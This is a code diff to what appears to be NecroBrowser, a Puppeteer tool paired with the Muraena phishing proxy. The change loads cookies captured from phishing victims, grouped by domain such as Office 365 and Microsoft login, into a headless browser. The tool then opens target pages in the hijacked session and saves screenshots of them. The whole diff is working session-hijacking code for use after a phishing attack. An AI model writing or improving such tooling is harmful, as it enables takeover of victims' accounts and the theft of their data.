@@ -21,6 +21,29 @@ exports.ScreenshotPages = async ({ page, data: [taskId, cookies, params] }) => {
 
         await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
 
+        // Set cookies once before navigating, grouped by domain.
+        // Cookies from Muraena come with their original domains (e.g. .office365.com,
+        // .login.microsoftonline.com) and must be set per-domain, not overridden to a single host.
+        if (cookies && cookies.length > 0) {
+            // Group cookies by domain to set them with proper URL context
+            const cookiesByDomain = {};
+            for (const c of cookies) {
+                const domain = c.domain || '';
+                if (!cookiesByDomain[domain]) cookiesByDomain[domain] = [];
+                cookiesByDomain[domain].push(c);
+            }
+
+            for (const [domain, domainCookies] of Object.entries(cookiesByDomain)) {
+                // Build a URL context from the cookie domain for proper secure cookie setting
+                const cleanDomain = domain.startsWith('.') ? domain.substring(1) : domain;
+                const urlContext = cleanDomain ? `https://${cleanDomain}/` : null;
+                await necrohelp.SetCookies(page, domainCookies, {
+                    url: urlContext
+                });
+                console.log(`[${taskId}] set ${domainCookies.length} cookies for domain: ${domain}`);
+            }
+        }
+
         // screenshot urls of interest
         for(let url of params.urls){
             try {
@@ -29,16 +52,9 @@ exports.ScreenshotPages = async ({ page, data: [taskId, cookies, params] }) => {
                     pName = "index"
                 }
 
-                // Set cookies before navigating to each target URL.
-                const urlObj = new URL(url);
-                await necrohelp.SetCookies(page, cookies, {
-                    url: urlObj.origin + '/',
-                    overrideDomain: params.overrideCookieDomain ? urlObj.hostname : null
-                });
-
-                await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 2000 });
+                await page.goto(url, { waitUntil: 'networkidle2', timeout: 30000 });
                 console.log(`[${taskId}] taking screenshot of page --> ${pName}`)
-                await new Promise(resolve => setTimeout(resolve, 300));
+                await necrohelp.Sleep(5000);
 
                 // Use absolute path and clean filename
                 const screenshotPath = `${extrusionPath}/screenshot_${pName}_${shortId}.png`;
